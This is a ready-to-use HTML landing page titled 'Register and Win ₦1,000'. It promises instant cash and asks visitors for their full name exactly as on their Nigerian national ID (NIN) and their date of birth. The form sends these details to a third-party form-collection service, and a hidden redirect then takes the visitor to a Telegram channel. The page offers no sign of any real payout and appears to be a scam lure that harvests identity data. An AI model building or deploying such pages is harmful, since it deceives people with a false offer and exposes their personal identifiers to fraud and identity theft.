<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Register and Win ₦1,000</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #27ae60, #2ecc71);
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
      max-width: 400px;
      width: 90%;
    }

    h2 {
      text-align: center;
      color: #2c3e50;
      margin-bottom: 10px;
    }

    p {
      text-align: center;
      margin-bottom: 25px;
      color: #555;
    }

    input[type="text"],
    input[type="date"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      color: #000; /* Dark black text */
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #27ae60;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #219150;
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: #888;
      margin-top: 20px;
    }

    @media screen and (max-width: 480px) {
      .container {
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Register & Win ₦1,000</h2>
    <p>Fill in your details to receive ₦1,000 instantly!</p>
    <form action="https://formspree.io/f/xvgalvqo" method="POST">
      <input type="text" name="fullname" placeholder="Full Name (as on NIN)" required />
      <input type="date" name="dob" required />
      <input type="hidden" name="_redirect" value="https://t.me/OfferForYou2025">
      <button type="submit">Claim ₦1,000</button>
    </form>
    <div class="footer">Powered by OfferForYou2025</div>
  </div>
</body>
</html>
